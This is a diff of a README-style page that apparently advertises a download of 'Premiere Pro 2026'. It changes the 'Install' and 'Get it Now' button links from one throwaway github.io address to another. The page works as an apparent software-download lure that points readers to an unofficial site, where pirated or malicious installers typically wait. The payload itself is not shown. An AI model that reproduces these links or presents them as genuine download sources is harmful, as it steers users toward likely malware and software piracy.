@@ -6,7 +6,7 @@
 
 <div align="center">
 
-[![Install](https://i.postimg.cc/HWQSXqhp/68747470733a2f2f692e706f7374696d.png)](https://a4-glent.github.io/.github/premiereA2026)
+[![Install](https://i.postimg.cc/HWQSXqhp/68747470733a2f2f692e706f7374696d.png)](https://poxmell.github.io/.github/premiereA2026)
 
 </div>
 
@@ -81,7 +81,7 @@ Premiere Pro's industry-standard position comes from its presence across every p
 
 <p align="center">
 
-[![Get it Now Premiere Pro 2026](https://img.shields.io/badge/Get_it_Now-0096C7?style=for-the-badge&logo=apple&logoColor=white)](https://a4-glent.github.io/.github/premiereA2026)
+[![Get it Now Premiere Pro 2026](https://img.shields.io/badge/Get_it_Now-0096C7?style=for-the-badge&logo=apple&logoColor=white)](https://poxmell.github.io/.github/premiereA2026)
 
 </p>
 
